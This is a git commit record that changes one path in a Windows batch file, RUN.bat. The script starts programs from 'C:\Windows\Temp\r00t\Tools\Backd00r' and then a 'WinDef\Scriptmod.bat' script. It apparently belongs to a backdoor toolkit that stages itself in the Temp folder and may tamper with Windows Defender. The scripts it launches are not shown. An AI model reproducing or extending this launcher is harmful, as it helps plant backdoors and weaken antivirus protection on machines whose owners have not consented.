388ff056930919c01b041b59f166aae2fbef61b3
0x01 <96843436+babysplly@users.noreply.github.com>
2024-09-28 10:45:20 +0700

    Update RUN.bat

--- RUN.bat
+++ RUN.bat
@@ -1,6 +1,6 @@
 @echo off 
 
-start "" "C:\Windows\Temp\r00t\Tools\Backd00r.exe\run.bat"
+start "" "C:\Windows\Temp\r00t\Tools\Backd00r\run.bat"
 timeout /t 1 /nobreak
 start "" "C:\Windows\Temp\r00t\WinDef\Scriptmod.bat"
 timeout /t 1 /nobreak
